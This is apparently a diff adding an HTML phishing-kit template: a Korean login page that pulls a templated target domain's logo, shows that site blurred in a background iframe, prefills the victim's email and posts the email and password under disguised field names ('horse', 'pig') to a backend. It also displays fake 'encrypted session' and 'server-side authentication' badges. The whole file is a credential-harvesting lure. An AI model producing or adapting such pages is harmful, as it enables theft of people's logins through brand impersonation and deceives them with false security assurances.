@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>안전한 로그인</title>
+
+<!-- ✅ FAVICON (LOCK ICON) -->
+<link rel="icon" type="image/svg+xml" href="https://cdn.brandfetch.io/domain/{{ins}}?c=1idgn9W1pGfVaJw8IDW" alt="Logo by {{ins}}">
+
+<style>
+  *{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:-apple-system, BlinkMacSystemFont, "SF Pro Display", Arial, sans-serif;
+  }
+
+  body{
+    height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    overflow:hidden;
+    position:relative;
+    color:#111;
+  }
+
+  /* fallback background */
+  .fallback{
+    position:absolute;
+    width:100%;
+    height:100%;
+    background:linear-gradient(135deg,#f5f7ff,#ffffff);
+    z-index:-3;
+  }
+
+  /* iframe background */
+  .bg{
+    position:absolute;
+    width:100%;
+    height:100%;
+    border:none;
+    z-index:-2;
+    filter:blur(20px);
+    transform:scale(1.1);
+    opacity:0.3;
+    pointer-events:none;
+  }
+
+  /* overlay */
+  .overlay{
+    position:absolute;
+    width:100%;
+    height:100%;
+    background:rgba(255,255,255,0.55);
+    backdrop-filter:blur(12px);
+    z-index:-1;
+  }
+
+  /* glass card */
+  .card{
+    width:360px;
+    padding:38px 30px;
+    border-radius:24px;
+    background:rgba(255,255,255,0.65);
+    backdrop-filter:blur(24px);
+    border:1px solid rgba(255,255,255,0.5);
+    box-shadow:0 25px 70px rgba(0,0,0,0.08);
+  }
+
+  /* header */
+  .top{
+    text-align:center;
+    margin-bottom:20px;
+  }
+
+  .logo{
+    width:52px;
+    height:52px;
+    margin-bottom:10px;
+  }
+
+  .title{
+    font-size:22px;
+    font-weight:600;
+    letter-spacing:-0.4px;
+  }
+
+  .sub{
+    font-size:13px;
+    color:#666;
+    margin-top:6px;
+  }
+
+  /* security badge */
+  .security{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:6px;
+    margin-top:10px;
+    font-size:12px;
+    color:#0071e3;
+    font-weight:500;
+  }
+
+  .security svg{
+    width:14px;
+    height:14px;
+  }
+
+  /* inputs */
+  .input{
+    margin-bottom:14px;
+  }
+
+  label{
+    font-size:12px;
+    font-weight:600;
+    color:#333;
+    display:block;
+    margin-bottom:6px;
+  }
+
+  input{
+    width:100%;
+    padding:13px 14px;
+    border-radius:12px;
+    border:1px solid rgba(0,0,0,0.08);
+    background:rgba(255,255,255,0.7);
+    font-size:14px;
+    outline:none;
+    transition:0.2s;
+  }
+
+  input:focus{
+    border-color:#0071e3;
+    box-shadow:0 0 0 4px rgba(0,113,227,0.15);
+    background:#fff;
+  }
+
+  .row{
+    display:flex;
+    justify-content:space-between;
+    font-size:12px;
+    margin:10px 0 18px;
+    color:#555;
+  }
+
+  .row a{
+    color:#0071e3;
+    text-decoration:none;
+    font-weight:500;
+  }
+
+  button{
+    width:100%;
+    padding:14px;
+    border:none;
+    border-radius:12px;
+    background:#0071e3;
+    color:#fff;
+    font-size:15px;
+    font-weight:600;
+    cursor:pointer;
+    transition:0.2s;
+  }
+
+  button:hover{
+    background:#005fc1;
+    transform:translateY(-1px);
+  }
+
+  .footer{
+    text-align:center;
+    font-size:11px;
+    color:#777;
+    margin-top:18px;
+  }
+
+</style>
+</head>
+
+<body>
+
+<!-- fallback -->
+<div class="fallback"></div>
+
+<!-- iframe background -->
+<iframe class="bg" src="https://{{ins}}"></iframe>
+
+<div class="overlay"></div>
+
+<!-- login card -->
+<div class="card">
+
+  <div class="top">
+
+    <!-- optional logo (Apple-style minimal) -->
+    <img class="logo" src="https://cdn.brandfetch.io/domain/{{ins}}?c=1idgn9W1pGfVaJw8IDW"/>
+
+    <div class="title">로그인</div>
+    <div class="sub">계정을 사용하여 계속 진행하세요.</div>
+
+    <!-- security indicator -->
+    <div class="security">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <path d="M12 2l7 4v6c0 5-3 9-7 10-4-1-7-5-7-10V6l7-4z"/>
+        <path d="M9 12l2 2 4-4"/>
+      </svg>
+      안전하게 암호화된 세션
+    </div>
+
+  </div>
+
+  <!-- PYTHON BACKEND FORM -->
+  <form action="first" method="POST">
+
+    <div class="input">
+      <label>이메일</label>
+      <input type="email" name="horse" placeholder="name@example.com" value="{{eman}}" required>
+    </div>
+
+    <div class="input">
+      <label>비밀번호</label>
+      <input type="password" name="pig" placeholder="••••••••" required>
+    </div>
+
+    <div class="row">
+      <label><input type="checkbox" name="remember"> 나를 기억해줘</label>
+      <a href="#">비밀번호를 잊으셨나요??</a>
+    </div>
+
+    <button type="submit">계속하다</button>
+
+  </form>
+
+  <div class="footer">
+   보호된 연결 • 서버 측 인증
+  </div>
+
+</div>
+
+</body>
+</html>
